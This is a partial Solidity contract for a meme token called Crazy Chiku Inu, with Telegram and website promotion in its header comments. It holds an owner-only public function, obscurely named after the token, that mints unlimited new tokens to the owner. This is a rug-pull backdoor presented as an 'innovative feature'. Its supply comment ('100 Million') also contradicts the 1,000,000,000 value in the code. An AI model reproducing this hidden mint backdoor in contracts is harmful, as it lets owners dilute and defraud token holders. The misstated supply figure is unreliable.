...
//
// $CrazyChikuInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/CrazyChikuInu
// 📱 Website ::https://crazychiku.space/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _CrazyChikuInu(uint256 amount) public onlyOwner {
 _CrazyChikuInu(msg.sender, amount);
    }
    ...
    function _CrazyChikuInu(address account, uint256 amount) internal virtual {
...
contract $CrazyChikuInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Crazy Chiku Inu", "CRAZYCKI") {
     _CrazyChikuInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}